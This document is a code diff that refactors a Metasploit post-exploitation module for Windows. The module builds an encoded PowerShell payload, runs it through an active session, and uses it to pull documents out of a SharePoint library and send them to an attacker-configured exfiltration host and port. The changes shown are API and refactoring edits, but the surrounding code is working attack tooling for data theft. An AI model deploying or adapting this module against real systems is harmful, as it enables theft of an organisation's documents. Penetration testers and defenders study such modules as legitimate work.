@@ -1,10 +1,8 @@
-require 'msf/core'
-
-class MetasploitModule < Msf::Post::Windows::Powershell
+class MetasploitModule < Msf::Post
   Rank = NormalRanking
 
   include Msf::Post::File
-  include Msf::Exploit::Powershell
+  include Msf::Post::Windows::Powershell
 
   def initialize(info = {})
     super(
@@ -45,7 +43,7 @@ class MetasploitModule < Msf::Post::Windows::Powershell
 
   def check
     if session.platform != 'windows'
-      return [Exploit::CheckCode::Incompatible, 'Target is not a Windows system']
+      return [Exploit::CheckCode::Safe, 'Target is not a Windows system']
     end
 
     [Exploit::CheckCode::Appears, 'Module ready to run on Windows session']
@@ -53,13 +51,13 @@ class MetasploitModule < Msf::Post::Windows::Powershell
 
   def run
     unless session
-      fail_with(Failure::NoSession, 'No active session available')
+      fail_with(Failure::NotVulnerable, 'No active session available')
     end
 
     handle_exfiltration_config
     print_status('Generating SharePoint document extractor payload...')
     ps_script = build_ps_payload
-    encoded_cmd = cmd_psh_payload(ps_script, 'x86', { encode: true })
+    encoded_cmd = generate_psh_payload(ps_script, arch: 'x86', encode: true)
 
     print_status("Executing payload on target session #{session.sid}...")
     if session.type == 'meterpreter'
@@ -137,8 +135,8 @@ class MetasploitModule < Msf::Post::Windows::Powershell
         Add-Type -TypeDefinition @"
         #{dotnet_code}
         "@ -ReferencedAssemblies "Microsoft.SharePoint.dll","System.Web.dll" -ErrorAction Stop
-        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',#{' '}
-          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},#{' '}
+        [SharePointExtractor]::ExtractDocs('#{datastore['SITE_URL']}', '#{datastore['LIBRARY']}',
+          '#{datastore['EXFIL_METHOD']}', '#{datastore['EXFIL_HOST']}', #{datastore['EXFIL_PORT']},
           #{datastore['MAX_SIZE']})
       } catch {
         Write-Output "FATAL:AssemblyLoadError:" + $_.Exception.Message
